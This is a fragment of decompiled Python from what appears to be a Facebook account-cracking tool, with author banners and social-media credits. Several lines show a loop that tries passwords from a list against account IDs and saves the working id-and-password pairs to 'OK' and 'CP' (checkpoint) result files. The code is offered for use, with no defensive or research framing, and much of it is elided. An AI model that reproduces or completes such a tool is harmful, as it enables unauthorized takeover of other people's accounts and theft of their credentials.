# Decompiled By Jaikumar
# Github : https://github.com/Herojaikumar
...
####LOGO####
            """
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sDesign By %sJAIKUMAR %s& %sAYAZ\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/jaikumar.parhyar.562\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sFacebook.com/jaikumar.parhyar.562\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/jaikumarhero\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))
                                      """
def menu_log():
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    try:
                        ...
                        open("JAIKUMAR -CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                    ...
                    open("JAIKUMAR -CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r%s[%sRANA-MZ{OK}%s] %s • %s%s     "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("JAIKUMAR -OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
...
def cek_hasil():
    ...
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sExample File : JAIKUMAR -CP/%s.txt'%(O,P,O,P,tanggal))
...
def started():
    ...
    print('%s╠══[%s•%s] %sAccount [OK] Saved To JAIKUMAR -OK/%s.txt'%(O,P,O,P,tanggal))
    print('%s╠══[%s•%s] %sAccount [CP] Saved To JAIKUMAR -CP/%s.txt'%(O,P,O,P,tanggal))
